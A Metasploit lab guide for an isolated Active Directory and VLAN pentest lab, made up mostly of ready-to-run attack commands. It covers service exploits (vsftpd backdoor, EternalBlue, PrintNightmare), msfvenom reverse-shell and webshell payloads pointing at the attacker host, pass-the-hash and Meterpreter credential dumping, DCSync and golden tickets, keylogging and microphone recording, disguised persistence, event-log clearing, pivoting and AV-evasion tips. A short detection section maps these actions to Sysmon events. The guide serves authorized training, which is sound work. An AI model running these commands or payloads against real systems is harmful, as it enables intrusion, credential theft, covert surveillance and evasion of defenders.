# Metasploit Framework — Lab Guide

A practical guide for using Metasploit against the targets in the AD Pentest Lab and VLAN Lab. All commands use real IPs and hostnames from the lab network. All testing is authorized within the isolated lab environment only.

**Lab network (flat):** `172.28.128.0/24`
**Lab network (VLAN):** `172.28.x.0/24` per VLAN
**Attacker:** Kali Linux at `172.28.128.10` (flat) or `172.28.99.10` (VLAN)

---

## Table of Contents

1. [Setup and Configuration](#1-setup-and-configuration)
2. [Core Concepts](#2-core-concepts)
3. [Workspace and Database Management](#3-workspace-and-database-management)
4. [Reconnaissance with Metasploit](#4-reconnaissance-with-metasploit)
5. [Metasploitable2 Exploitation](#5-metasploitable2-exploitation)
6. [Windows Target Exploitation](#6-windows-target-exploitation)
7. [Meterpreter Post-Exploitation](#7-meterpreter-post-exploitation)
8. [Msfvenom Payload Generation](#8-msfvenom-payload-generation)
9. [Pivoting Through the Network](#9-pivoting-through-the-network)
10. [Auxiliary Modules](#10-auxiliary-modules)
11. [Active Directory Integration](#11-active-directory-integration)
12. [Resource Scripts](#12-resource-scripts)
13. [Detection and Evasion Awareness](#13-detection-and-evasion-awareness)

---

## 1. Setup and Configuration

### Start Metasploit with Database

```bash
# Start PostgreSQL (required for workspace and search)
sudo systemctl start postgresql
sudo msfdb init          # First time only

# Launch console
msfconsole

# Verify database connection
msf6 > db_status
# Expected: Connected to msf. Connection type: postgresql
```

### Essential Settings to Set Once Per Session

```bash
# Set global attacker IP so you don't retype it
msf6 > setg LHOST 172.28.128.10

# Set a global timeout
msf6 > setg ConnectTimeout 10
```

---

## 2. Core Concepts

### Module Types

| Type | Prefix | Purpose |
|------|--------|---------|
| Exploit | `exploit/` | Deliver a payload to a vulnerable service |
| Auxiliary | `auxiliary/` | Scan, fuzz, brute force, MITM — no payload |
| Post | `post/` | Run after gaining a session (enum, pivot, persist) |
| Payload | `payload/` | Code executed on the target after exploitation |
| Encoder | `encoder/` | Obfuscate payloads to evade AV signatures |
| NOP | `nop/` | NOP sled generators for buffer overflow padding |

### Payload Types

| Type | Description | When to use |
|------|-------------|-------------|
| `singles` | Self-contained, no stager | Unreliable networks |
| `stagers` | Small — downloads second stage | Most common |
| `stages` | Second stage (Meterpreter, shell) | Used with stager |
| `inline` | Stager + stage in one | Preferred when size permits |

### Common Payloads

```
windows/x64/meterpreter/reverse_tcp     # Windows 64-bit, staged, TCP reverse
windows/x64/meterpreter_reverse_https   # Windows 64-bit, stageless, HTTPS (stealthier)
linux/x86/meterpreter/reverse_tcp       # Linux 32-bit, staged
linux/x64/meterpreter/reverse_tcp       # Linux 64-bit, staged
cmd/unix/reverse_bash                   # Simple bash reverse shell (no Meterpreter)
```

### Module Workflow

```bash
# 1. Find the module
msf6 > search vsftpd

# 2. Select it
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 3. Check required options
msf6 exploit(...) > options
msf6 exploit(...) > info

# 4. Set options
msf6 exploit(...) > set RHOSTS 172.28.128.12
msf6 exploit(...) > set LHOST 172.28.128.10

# 5. Run
msf6 exploit(...) > run
# or
msf6 exploit(...) > exploit
```

---

## 3. Workspace and Database Management

Workspaces keep results organized by engagement. Use one per lab session.

```bash
# List workspaces
msf6 > workspace

# Create a workspace for this lab
msf6 > workspace -a ad-pentest-lab

# Switch workspace
msf6 > workspace ad-pentest-lab

# Import nmap scan results
msf6 > db_import /tmp/lab_scan.xml

# View discovered hosts
msf6 > hosts
msf6 > services
msf6 > vulns

# Search the database
msf6 > hosts -R        # Set RHOSTS from all discovered hosts
msf6 > services -p 445 # Filter by port

# Export results
msf6 > db_export -f xml /tmp/msf_results.xml
```

### Nmap From Inside Metasploit

```bash
# Run nmap and import results automatically
msf6 > db_nmap -sV -sC -p- --min-rate 2000 172.28.128.0/24

# Check what was found
msf6 > hosts
msf6 > services
```

---

## 4. Reconnaissance with Metasploit

### SMB Enumeration

```bash
# SMB version detection
use auxiliary/scanner/smb/smb_version
set RHOSTS 172.28.128.0/24
run

# Check SMB signing (relay prerequisite)
use auxiliary/scanner/smb/smb2
set RHOSTS 172.28.128.0/24
run

# Enumerate shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 172.28.128.21
set SMBUser vagrant
set SMBPass Vagrant123!
run

# Enumerate users
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 172.28.128.21
set SMBUser vagrant
set SMBPass Vagrant123!
run

# MS17-010 (EternalBlue) check
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.28.128.0/24
run
```

### Port and Service Scanning

```bash
# TCP port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.28.128.0/24
set PORTS 21,22,23,25,80,135,139,443,445,1433,3389,5985,8080
set THREADS 50
run

# SYN scanner (faster, requires root)
use auxiliary/scanner/portscan/syn
set RHOSTS 172.28.128.0/24
set PORTS 1-1024
set THREADS 50
run
```

### HTTP and Web Enumeration

```bash
# HTTP version detection
use auxiliary/scanner/http/http_version
set RHOSTS 172.28.128.0/24
set PORTS 80,8080,8443,443
run

# Directory brute force
use auxiliary/scanner/http/dir_scanner
set RHOSTS 172.28.128.15
set PATH /
run

# HTTP title grabbing
use auxiliary/scanner/http/title
set RHOSTS 172.28.128.0/24
run
```

### FTP Enumeration

```bash
# FTP anonymous access check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 172.28.128.12
run

# FTP version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 172.28.128.12
run
```

### LDAP and AD Enumeration

```bash
# LDAP enumeration
use auxiliary/scanner/ldap/ldap_login
set RHOSTS 172.28.128.21
set USERNAME vagrant
set PASSWORD Vagrant123!
set BASE_DN dc=lab,dc=local
run

# SMB login test
use auxiliary/scanner/smb/smb_login
set RHOSTS 172.28.128.0/24
set SMBUser vagrant
set SMBPass Vagrant123!
run
```

---

## 5. Metasploitable2 Exploitation

Metasploitable2 (`172.28.128.12` / `172.28.40.12` in VLAN) is a deliberately vulnerable Linux VM. It is the safest target to learn Metasploit exploitation flows.

### VsFTPd 2.3.4 Backdoor

The VsFTPd 2.3.4 binary was backdoored with a shell triggered by a smiley face `:)` in the username.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.28.128.12
run

# Expected result: root shell on port 6200
# [*] Banner: 220 (vsFTPd 2.3.4)
# [*] USER: 331 Please specify the password.
# [+] Backdoor service has been spawned, handling...
# [+] UID: uid=0(root) gid=0(root)
```

### Samba Usermap Script (CVE-2007-2447)

Samba 3.0.20 through 3.0.25rc3 allows command injection via the username field when using non-default "username map script" configuration.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 172.28.128.12
set LHOST 172.28.128.10
run

# Expected result: root shell
# [*] Started reverse TCP double handler on 172.28.128.10:4444
# [*] Accepted the first client connection...
# [+] Command shell session 1 opened
```

### PHP CGI Argument Injection

Metasploitable2 runs PHP in CGI mode with the `-s` flag exposed.

```bash
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 172.28.128.12
set LHOST 172.28.128.10
set TARGETURI /
run

# Expected: Meterpreter session
```

### Distcc Remote Code Execution

The distributed compiler daemon distcc runs on port 3632 and does not authenticate.

```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 172.28.128.12
set LHOST 172.28.128.10
set PAYLOAD cmd/unix/reverse_bash
run
```

### PostgreSQL Remote Code Execution

Default credentials `postgres:postgres` are active on Metasploitable2.

```bash
# Verify credentials first
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 172.28.128.12
set USERNAME postgres
set PASSWORD postgres
run

# Exploit
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS 172.28.128.12
set USERNAME postgres
set PASSWORD postgres
set LHOST 172.28.128.10
run
```

### Java RMI Server (port 1099)

```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS 172.28.128.12
set LHOST 172.28.128.10
run
```

### Tomcat Manager Upload

Metasploitable2 runs Tomcat on port 8180 with default credentials `tomcat:tomcat`.

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.28.128.12
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 172.28.128.10
run
```

### UnrealIRCd Backdoor (port 6667)

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 172.28.128.12
set LHOST 172.28.128.10
run
```

---

## 6. Windows Target Exploitation

### EternalBlue — MS17-010 (SMB)

EternalBlue exploits a buffer overflow in the SMBv1 protocol. Only run against systems in your lab that are confirmed vulnerable.

```bash
# Verify target is vulnerable first
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.28.128.30
run

# Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.28.128.30
set LHOST 172.28.128.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Expected: Meterpreter session as NT AUTHORITY\SYSTEM
```

### PsExec with Credentials

Once you have credentials or NT hashes, PsExec gives you a remote shell.

```bash
use exploit/windows/smb/psexec
set RHOSTS 172.28.128.30
set SMBUser administrator
set SMBPass Passw0rd!
set LHOST 172.28.128.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# With NT hash (Pass-the-Hash)
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:NTHASH
run
```

### WinRM Login

```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 172.28.128.30
set USERNAME administrator
set PASSWORD Passw0rd!
run

use exploit/windows/winrm/winrm_script_exec
set RHOSTS 172.28.128.30
set USERNAME administrator
set PASSWORD Passw0rd!
set LHOST 172.28.128.10
run
```

### Print Spooler — PrintNightmare (CVE-2021-34527)

```bash
use exploit/windows/dcerpc/cve_2021_1675_printspooler
set RHOSTS 172.28.128.73
set SMBUser vagrant
set SMBPass Vagrant123!
set LHOST 172.28.128.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### MS-SQL Exploitation (db01 — 172.28.128.23)

```bash
# Scan for SQL Server
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 172.28.128.23
run

# Login check
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 172.28.128.23
set USERNAME sa
set PASSWORD SaAdmin123!
run

# Execute OS commands via xp_cmdshell
use auxiliary/admin/mssql/mssql_exec
set RHOSTS 172.28.128.23
set USERNAME sa
set PASSWORD SaAdmin123!
set CMD whoami
run

# Full shell
use exploit/windows/mssql/mssql_payload
set RHOSTS 172.28.128.23
set USERNAME sa
set PASSWORD SaAdmin123!
set LHOST 172.28.128.10
run
```

---

## 7. Meterpreter Post-Exploitation

Once you have a Meterpreter session, these are the most useful commands organized by objective.

### Session Management

```bash
# List all open sessions
msf6 > sessions -l

# Interact with session 1
msf6 > sessions -i 1

# Run a command across all sessions
msf6 > sessions -c "getuid" -i 1,2,3

# Background a session
meterpreter > background
# or Ctrl+Z
```

### Situational Awareness

```bash
meterpreter > sysinfo          # OS, hostname, architecture
meterpreter > getuid           # Current user context
meterpreter > getpid           # Current process ID
meterpreter > ps               # Running processes
meterpreter > netstat          # Network connections
meterpreter > ipconfig         # Network interfaces
meterpreter > arp              # ARP cache (network neighbors)
meterpreter > route            # Routing table
meterpreter > idletime         # Time since last user input
```

### Privilege Escalation

```bash
# Check current privileges
meterpreter > getprivs

# Attempt automatic privilege escalation
meterpreter > getsystem

# If getsystem fails, try manual techniques
msf6 > use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Token impersonation
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > impersonate_token "LAB\\Administrator"

# Revert to original token
meterpreter > rev2self
```

### Credential Harvesting

```bash
# Dump hashes from SAM (requires SYSTEM)
meterpreter > hashdump

# Mimikatz integration (kiwi module)
meterpreter > load kiwi
meterpreter > creds_all         # All credentials
meterpreter > lsa_dump_sam      # SAM hashes
meterpreter > lsa_dump_secrets  # LSA secrets
meterpreter > dcsync_ntlm       # DCSync for specific user
meterpreter > dcsync_ntlm administrator

# Golden ticket creation from Meterpreter
meterpreter > golden_ticket_create \
  -u administrator \
  -d lab.local \
  -k KRBTGT_HASH \
  -s DOMAIN_SID \
  -t /tmp/golden.tkt
```

### File System

```bash
meterpreter > pwd               # Current directory
meterpreter > ls                # List directory
meterpreter > cd C:\\Users      # Change directory
meterpreter > cat C:\\file.txt  # Read file
meterpreter > download C:\\Windows\\NTDS\\ntds.dit /tmp/
meterpreter > upload /tmp/tool.exe C:\\Windows\\Temp\\
meterpreter > search -f *.txt   # Search for files
meterpreter > search -f *.kdbx  # Search for KeePass databases
meterpreter > search -f unattend.xml  # Search for creds
```

### Screenshots and Keylogging

```bash
meterpreter > screenshot        # Capture current screen
meterpreter > keyscan_start     # Begin keylogger
meterpreter > keyscan_dump      # Retrieve captured keystrokes
meterpreter > keyscan_stop      # Stop keylogger
meterpreter > webcam_list       # List webcams
meterpreter > record_mic -d 10  # Record 10 seconds of audio
```

### Persistence

```bash
# Scheduled task persistence
meterpreter > run post/windows/manage/persistence_exe \
  STARTUP=SCHEDULER \
  STARTUP_NAME=WindowsUpdate \
  SESSION=1

# Registry run key
meterpreter > run post/windows/manage/persistence \
  STARTUP=REGISTRY \
  DELAY=10 \
  SESSION=1
```

### Cleanup

```bash
# Clear Windows event logs
meterpreter > clearev

# Remove a specific file
meterpreter > rm C:\\Windows\\Temp\\tool.exe

# Migrate to another process (avoid detection)
meterpreter > ps | grep explorer
meterpreter > migrate 1234    # PID of target process
```

---

## 8. Msfvenom Payload Generation

Msfvenom creates standalone payloads to deliver outside of direct exploitation.

### Windows Payloads

```bash
# Standard staged reverse TCP (most common)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f exe -o /tmp/payload.exe

# Stageless HTTPS (stealthier, no second connection)
msfvenom \
  -p windows/x64/meterpreter_reverse_https \
  LHOST=172.28.128.10 LPORT=443 \
  -f exe -o /tmp/payload_https.exe

# DLL (for DLL injection or hijacking)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f dll -o /tmp/payload.dll

# PowerShell one-liner (copy to clipboard)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f psh-cmd

# HTA file (HTML Application — opens in mshta.exe)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f hta-psh -o /tmp/payload.hta
```

### Linux Payloads

```bash
# Linux 64-bit ELF
msfvenom \
  -p linux/x64/meterpreter/reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f elf -o /tmp/payload_linux

chmod +x /tmp/payload_linux

# Bash reverse shell (no Meterpreter, very portable)
msfvenom \
  -p cmd/unix/reverse_bash \
  LHOST=172.28.128.10 LPORT=4444 \
  -f raw -o /tmp/payload.sh
```

### Web Payloads

```bash
# PHP webshell
msfvenom \
  -p php/meterpreter_reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f raw -o /tmp/shell.php

# JSP (Java Server Pages — for Tomcat)
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f raw -o /tmp/shell.jsp

# WAR (Web Application Archive — deploy to Tomcat manager)
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=172.28.128.10 LPORT=4444 \
  -f war -o /tmp/shell.war
```

### Setting Up the Handler

Always set up the handler before executing the payload on the target.

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.28.128.10
set LPORT 4444
set ExitOnSession false   # Keep listening for multiple connections
run -j                    # Run as background job
```

---

## 9. Pivoting Through the Network

Pivoting routes traffic through a compromised host to reach networks that Kali cannot directly access. Most relevant in the VLAN lab.

### Route-Based Pivoting (SOCKS)

```bash
# After getting a Meterpreter session on a host
# that can reach another subnet

# Add a route through session 1 to the target subnet
msf6 > route add 172.28.20.0/24 1   # Route VLAN 20 through session 1
msf6 > route add 172.28.30.0/24 1   # Route VLAN 30 through session 1
msf6 > route print

# Start a SOCKS proxy through the session
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Configure proxychains
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Now use proxychains for any tool
proxychains nmap -sT -Pn 172.28.20.30
proxychains nxc smb 172.28.20.30 -u admin -p pass
proxychains evil-winrm -i 172.28.20.30 -u admin -p pass
```

### Port Forwarding

```bash
# Forward local port to remote host through the session
# Useful for accessing a web service or RDP on an internal host

meterpreter > portfwd add -l 3389 -p 3389 -r 172.28.20.30
# Now: xfreerdp /v:127.0.0.1:3389 /u:administrator

meterpreter > portfwd add -l 8080 -p 80 -r 172.28.30.71
# Now: curl http://127.0.0.1:8080

meterpreter > portfwd list   # Show active forwards
meterpreter > portfwd delete -l 3389 -p 3389 -r 172.28.20.30
```

### AutoRoute (Simpler Route Setup)

```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.28.20.0
set NETMASK 24
run

# Or auto-discover and add all routes
set CMD autoadd
run
```

---

## 10. Auxiliary Modules

Auxiliary modules do not deliver payloads — they scan, enumerate, brute force, or support other attacks.

### Brute Force

```bash
# SMB login brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 172.28.128.0/24
set USER_FILE /tmp/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
set VERBOSE false
run

# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.28.128.72
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
run
```

### Network Capture

```bash
# ARP spoof + packet capture (useful for MITM in flat network)
use auxiliary/spoof/arp/arp_poisoning
set SHOST 172.28.128.21    # Spoof as DC
set DHOSTS 172.28.128.30   # Target: win10
set INTERFACE eth1
run

# Packet capture on an interface (requires root)
use auxiliary/sniffer/psnuffle
set INTERFACE eth1
run
```

### Vulnerability Checking

```bash
# Check for MS08-067 (good for older Windows)
use auxiliary/scanner/smb/smb_ms08_067
set RHOSTS 172.28.128.0/24
run

# BlueKeep check (CVE-2019-0708, RDP)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 172.28.128.0/24
run

# ZeroLogon check (CVE-2020-1472)
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set RHOSTS 172.28.128.21
set NBNAME DC01
run
```

---

## 11. Active Directory Integration

Metasploit has several post-exploitation modules specifically for AD environments.

### Kerberoasting from Meterpreter

```bash
use auxiliary/gather/get_user_spns
set RHOSTS 172.28.128.21
set SMBUser vagrant
set SMBPass Vagrant123!
set DOMAIN lab.local
run
# Outputs hashcat-ready hashes
```

### Enumerate Domain Information

```bash
# Enumerate domain controllers
use post/windows/gather/enum_domain
set SESSION 1
run

# Enumerate domain users
use post/windows/gather/enum_ad_users
set SESSION 1
set BASE_DN dc=lab,dc=local
run

# Enumerate domain groups
use post/windows/gather/enum_ad_groups
set SESSION 1
run

# Enumerate domain computers
use post/windows/gather/enum_ad_computers
set SESSION 1
run
```

### Credential Collection

```bash
# Dump all cached credentials
use post/windows/gather/credentials/credential_collector
set SESSION 1
run

# Smart hashdump (tries multiple methods)
use post/windows/gather/smart_hashdump
set SESSION 1
set GETSYSTEM true
run

# DPAPI credential extraction
use post/windows/gather/credentials/dpapi
set SESSION 1
run
```

---

## 12. Resource Scripts

Resource scripts automate repetitive tasks. Save them as `.rc` files and load with `msfconsole -r script.rc`.

### Lab Recon Script

```bash
# Save as /tmp/lab_recon.rc
cat > /tmp/lab_recon.rc << 'RCEOF'
workspace -a ad-pentest-lab
setg LHOST 172.28.128.10
db_nmap -sV -sC --top-ports 500 172.28.128.0/24
use auxiliary/scanner/smb/smb_version
set RHOSTS 172.28.128.0/24
run
use auxiliary/scanner/smb/smb2
set RHOSTS 172.28.128.0/24
run
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.28.128.0/24
run
hosts
services
RCEOF

msfconsole -r /tmp/lab_recon.rc
```

### Metasploitable2 Auto-Exploit Script

```bash
cat > /tmp/meta2_exploit.rc << 'RCEOF'
setg RHOSTS 172.28.128.12
setg LHOST 172.28.128.10
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.28.128.12
run -j
use exploit/multi/samba/usermap_script
set RHOSTS 172.28.128.12
run -j
sessions -l
RCEOF

msfconsole -r /tmp/meta2_exploit.rc
```

### Multi-Handler Script

```bash
cat > /tmp/handler.rc << 'RCEOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.28.128.10
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/multi/manage/shell_to_meterpreter
run -j
RCEOF

msfconsole -r /tmp/handler.rc
```

---

## 13. Detection and Evasion Awareness

This section helps you understand what the blue team sees when you use Metasploit, so you can better interpret your lab results and understand the detection side.

### What Metasploit Generates That Gets Detected

**Network signatures:**
- Default Meterpreter uses a recognizable TLS certificate with specific fields
- The staged payload makes a second TCP connection to download the stage
- Metasploit default ports (4444) are flagged by IDS rules
- SMB exploitation leaves SMB version negotiation patterns

**Host signatures:**
- LSASS access from non-system processes (kiwi/hashdump)
- `getsystem` attempts named pipe impersonation — visible in Sysmon Event ID 7
- `clearev` generates Event ID 1102 immediately before clearing
- Meterpreter migration appears as Process Access (Sysmon Event ID 10)

### Reducing Noise in Lab Testing

```bash
# Use non-default ports
set LPORT 443     # Blend with HTTPS traffic
set LPORT 8443

# Use HTTPS instead of raw TCP (encrypts and uses valid-looking TLS)
set PAYLOAD windows/x64/meterpreter/reverse_https

# Set a sleep timer before callback (evades sandbox detonation)
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic

# Migrate to a less suspicious process immediately after session
set AutoRunScript migrate -n explorer.exe
```

### Sysmon Events Generated by Common Metasploit Actions

| Action | Sysmon Event | Event ID |
|--------|-------------|----------|
| Payload execution | Process Create | 1 |
| Meterpreter callback | Network Connection | 3 |
| getsystem (named pipe) | Pipe Connected | 17 |
| hashdump / kiwi | Process Access on LSASS | 10 |
| migrate | Process Access | 10 |
| Persistence via registry | Registry Set | 13 |
| clearev | — | Windows 1102 |
| File upload/download | File Create | 11 |

---

## Lab Quick Reference

### Flat Lab Targets

| Target | IP | Best Metasploit Approach |
|--------|----|--------------------------|
| metasploitable2 | 172.28.128.12 | vsftpd backdoor, usermap_script, distcc |
| win10 | 172.28.128.30 | psexec with credentials, EternalBlue if vulnerable |
| db01 | 172.28.128.23 | mssql_exec / mssql_payload with sa:SaAdmin123! |
| print01 | 172.28.128.73 | PrintNightmare CVE-2021-34527 |
| juice-shop | 172.28.128.15 | Web exploitation via http modules |

### VLAN Lab Targets

| Target | IP | VLAN | Best Approach |
|--------|----|------|---------------|
| metasploitable2 | 172.28.40.12 | 40 | vsftpd, usermap_script |
| juice-shop | 172.28.40.15 | 40 | http_* modules |
| db01 | 172.28.10.23 | 10 | mssql_* modules |
| print01 | 172.28.30.73 | 30 | PrintNightmare |
| win10 | 172.28.20.30 | 20 | psexec, pivot through to VLAN 30 |

---

## Disclaimer

All techniques in this guide are for authorized use in the isolated lab environment only. Do not use Metasploit or any offensive tool against systems you do not own or have explicit written authorization to test.
